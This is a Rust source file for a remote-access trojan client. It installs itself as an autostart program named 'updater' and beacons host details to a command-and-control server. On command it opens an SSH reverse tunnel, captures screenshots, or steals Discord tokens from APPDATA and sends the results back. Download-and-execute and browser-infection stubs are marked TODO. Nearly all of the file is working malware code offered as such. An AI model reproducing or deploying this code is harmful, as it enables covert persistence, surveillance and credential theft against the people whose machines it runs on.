mod token_stealer;

use core::str;
use std::{clone, env, net::Ipv4Addr, str::FromStr, time::Duration};
use auto_launch::AutoLaunchBuilder;
use local_ip_address::local_ip;
use reqwest::{blocking::Response, Error};
use serde::{Deserialize, Serialize};
use server::{run_stream, Auth, Config, Handler};
use token_stealer::find_token;
use tokio::net::ToSocketAddrs;
use whoami::{fallible::{distro, hostname}, platform};
use std::{fs, thread, time};
use rand::Rng;
use serde_json::json;
use p256::{
    ecdsa::{signature::Signer, signature::Verifier, Signature, SigningKey, VerifyingKey},
    elliptic_curve::PublicKey,
};
use sha2::{Digest, Sha256};
use hex;
use screenshots::Screen;
use substring::Substring;
use ssh2::Session;
use std::io::prelude::*;
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::sync::Arc;
use std::sync::Mutex;
use russh::*;
use russh_keys::*;

//TODO: implement simple SSH server class

#[derive(Deserialize)]
struct Command {
    prev: i64,
    nonce: i64,
    command: String,
    signature: String,
}

#[derive(Deserialize)]
struct UpdateResponse {
    success: bool,
    token: String,
    uid: String,
    pub_key: String,
}

#[derive(Serialize)]
pub struct Log {
    uid: String,
    key: String,
    value: String,
}

fn main() {

    let path = env::current_exe()
                        .unwrap()
                        .as_path()
                        .to_str()
                        .unwrap()
                        .to_owned();

    let auto = AutoLaunchBuilder::new()
        .set_app_name("updater")
        .set_app_path(&path)
        .set_use_launch_agent(true)
        .set_args(&["--minimized"])
        .build()
        .unwrap();

    // enable the autostart:
    if !auto.is_enabled().unwrap() {
        if auto.enable().is_ok() {
            // autostart was enabled
        }
    }


    let db: sled::Db = sled::open("version.cfg").unwrap();
    
    // restore stored values:
    let user_id_db = db.get(b"user_id");
    let access_token_db = db.get(b"access_token");
    let pub_key_db = db.get(b"pub_key");
    let previous_db = db.get(b"previous");
    let url_base = db.get(b"url_base");

    //TODO: hardcoded default for debugging:
    let url_base = "http://localhost:3000";

    let mut user_id: Option<String> = match user_id_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    Some(str::from_utf8(&y).unwrap().to_owned())
                },
                None => {
                    Option::None
                },
            }
        },
        Err(_) => {
            Option::None
        },
    };

    let mut access_token: Option<String> = match access_token_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    Some(str::from_utf8(&y).unwrap().to_owned())
                },
                None => {
                    Option::None
                },
            }
        },
        Err(_) => {
            Option::None
        },
    };

    let mut pub_key: Option<String> = match pub_key_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    Some(str::from_utf8(&y).unwrap().to_owned())
                },
                None => {
                    Option::None
                },
            }
        },
        Err(_) => {
            Option::None
        },
    };

    let mut previous: i64 = match previous_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    let str_data = str::from_utf8(&y).unwrap();
                    i64::from_str(str_data).unwrap()
                },
                None => {
                    0
                },
            }
        },
        Err(_) => {
            0
        },
    };

    loop {
        let internal_ip = local_ip().unwrap_or(std::net::IpAddr::V4(Ipv4Addr::from_str("127.0.0.1").unwrap())).to_string();
        let external_ip = "";
        let hostname = hostname().unwrap_or("UNKNOWN".to_owned());
        let operating_system = format!("{} - {}", platform(), distro().unwrap_or("UNKNOWN".to_owned()));
        
        // wait
        let sleep_secs = rand::thread_rng().gen_range(100..1000);
        let wait_time = time::Duration::from_secs(sleep_secs);

        thread::sleep(wait_time);
    
        // send update
        let http_client = reqwest::blocking::Client::new();
        let json = &json!({
            "internal_ip": internal_ip,
            "external_ip": external_ip,
            "hostname": hostname,
            "operating_system": operating_system
        });

        let res: Result<Response, Error>;
        if user_id.is_none() {
            res = http_client.post(format!("{}/update", url_base))
                .json(json)
                .send();

            if res.is_err() {
                continue;
            }

            let res_data: UpdateResponse = res.unwrap().json().unwrap();

            if res_data.success {
                user_id = Some(res_data.uid);
                access_token = Some(res_data.token);
                pub_key = Some(res_data.pub_key);

                let _ = db.insert(b"user_id", user_id.clone().unwrap().as_bytes());
                let _ = db.insert(b"access_token", access_token.clone().unwrap().as_bytes());
                let _ = db.insert(b"pub_key", pub_key.clone().unwrap().as_bytes());
            } else {
                continue;
            }
        } else {
            res = http_client.post(format!("{}/update/{}", url_base, user_id.clone().unwrap()))
                .json(json)
                .bearer_auth(access_token.clone().unwrap())
                .send();

            if res.is_err() {
                continue;
            }

            // read command
            let res = res.unwrap();
            let cmd = res.json();

            if cmd.is_err() {
                continue;
            }

            let cmd: Command = cmd.unwrap();

            // verify signature and nonce
            let mut verified = true;

            //TODO: verification
            /*
            if verified {
                let data = format!("{}{}{}", user_id.clone().unwrap(), access_token.clone().unwrap(), previous.clone().to_string());
                
                let mut hasher = Sha256::new();
                hasher.update(data.as_bytes());
                let hashed_data = hasher.finalize();

            }

            if verified {
                verified = cmd.prev == previous;
            }
            */

            if !verified {
                continue;
            } else {
                previous = cmd.nonce;
                let _ = db.insert(b"previous", previous.to_string().as_bytes());
            }

            // execute command
            let cmd_payload = cmd.command;
            let mut data: Log = Log { uid: ("".to_owned()), key: ("".to_owned()), value: ("".to_owned()) };
            data.uid = user_id.clone().unwrap();

            if cmd_payload.starts_with("00") { // open ssh
                //TODO:
                data.key = "open_ssh".to_owned();
            }
            else if cmd_payload.starts_with("01") { // close ssh
                //TODO:
                data.key = "close_ssh".to_owned();
            }
            else if cmd_payload.starts_with("02") { // open tunnel
                data.key = "open_tunnel".to_owned();

                //TODO: parsing the payload
                let server = "test.com:22";
                let username = "test";
                let password = "123456";
                let l_port = "8080";
                let r_port = "8080";
                thread::spawn( move ||{
                    let _ = open_ssh_tunnel(server, username, password, l_port, r_port);
                });
            }
            else if cmd_payload.starts_with("03") { // close tunnel
                //TODO:
                data.key = "close_tunnel".to_owned();
            }
            else if cmd_payload.starts_with("04") { // download and execute
                data.key = "download".to_owned();
                //TODO: download and execute
            }
            else if cmd_payload.starts_with("05") { // infect browser
                data.key = "browser_infection".to_owned();
                //TODO: infect browser
            }
            else if cmd_payload.starts_with("06") { // screenshot
                data.key = "screenshot".to_owned();

                let screens = Screen::all().unwrap();
                let mut ss_bytes = "".to_string();
                for screen in screens {
                    let image = screen.capture().unwrap();
                    ss_bytes.push_str(&format!("IMG({});",&hex::encode(image.into_vec())));
                }
                data.value = ss_bytes;
            }
            else if cmd_payload.starts_with("07") { // loot all
                data.key = "loot".to_owned();

                // Example stealer payload
                data.value = format!(
                    "{}\n{}\n{}\n{}",
                    find_token(format!("{}\\{}", env::var("APPDATA").unwrap(), "discord")),
                    find_token(format!("{}\\{}", env::var("APPDATA").unwrap(), "discordptb")),
                    find_token(format!("{}\\{}", env::var("APPDATA").unwrap(), "discordcanary")),
                    find_token(format!(
                        "{}\\{}",
                        env::var("APPDATA").unwrap(),
                        "Discord Bot Client"
                    ))
                );
            }
            else if cmd_payload.starts_with("08") { // sleep
                let d_str = cmd_payload.substring(3, cmd_payload.len()).to_string();
                let duration: i32 = d_str.parse().unwrap();
                thread::sleep(Duration::from_secs((duration * 60).try_into().unwrap()));
                data.value = format!("Just woke up after {} minutes!", duration).to_owned();
                data.key = "sleep".to_owned();
            }
            else if cmd_payload.starts_with("09") { // uninstall
                data.key = "uninstall".to_owned();

                // disable the autostart:
                if auto.is_enabled().unwrap() {
                    if auto.disable().is_ok() {
                        data.value = "auto start disabled".to_owned();
                    } else {
                        data.value = "error disabling auto start".to_owned();
                    }
                }

                //TODO: delete the current executable based on the OS
                // - check os
                // - spawn new shell process
                // - sleep for x seconds
                // - rm this image path
                
                //TODO: break;
            }
            else if cmd_payload.starts_with("10") { // change C2 address
                //TODO:
                //url_base = "stuff";
            }

            // send response log
            let _ = http_client.post(format!("{}/log", url_base))
                    .json(&json!({
                        "uid": data.uid,
                        "key": data.key,
                        "value": data.value,
                    }))
                    .bearer_auth(access_token.clone().unwrap())
                    .send();
        }
    }
}

fn open_ssh_tunnel(ssh_server: &str, ssh_username: &str, ssh_password: &str, l_port: &str, r_port: &str) -> Result<(), Box<dyn std::error::Error>> {
    // SSH server details
    let ssh_server = ssh_server;
    let ssh_username = ssh_username;
    let ssh_password = ssh_password;

    // Local address to bind the reverse tunnel
    let local_bind_address = format!("127.0.0.1:{}", l_port);
    
    // Connect to the SSH server
    let tcp = TcpStream::connect(ssh_server)?;
    let mut session = Session::new()?;
    session.set_tcp_stream(tcp);
    session.handshake()?;

    // Authenticate using a private key
    // let private_key_path = Path::new(ssh_private_key_path);
    // session.userauth_pubkey_file(ssh_username, None, private_key_path, None)?;

    let _ = session.userauth_password(ssh_username, ssh_password);

    if !session.authenticated() {
        return Err("Authentication failed".into());
    }

    // Create the reverse tunnel
    let mut listener = session.channel_forward_listen(r_port.parse::<u16>().unwrap_or(80), None, None)?;

    // Bind to a local port
    let local_listener = TcpListener::bind(local_bind_address)?;

    // Accept connections and forward them
    for stream in local_listener.incoming() {
        let mut stream = stream.unwrap();
        let mut remote_channel = listener.0.accept().unwrap();
        
        thread::spawn(move || {
            let mut stream_clone = stream.try_clone().expect("Failed to clone stream");

            thread::spawn(move || {
                let mut buf = vec![0; 1024];
                loop {
                    // Forward data from the local stream to the remote channel
                    let n = match stream_clone.read(&mut buf) {
                        Ok(n) if n == 0 => break,
                        Ok(n) => n,
                        Err(_) => {
                            break;
                        }
                    };

                    let _ = remote_channel.write_all(&buf[0..n]);

                    // Forward data from the remote channel to the local stream
                    let n = match remote_channel.read(&mut buf) {
                        Ok(n) if n == 0 => break,
                        Ok(n) => n,
                        Err(_) => {
                            break;
                        }
                    };
    
                    let _ = stream.write_all(&buf[0..n]);
                }
            });
        });
    }

    Ok(())
}
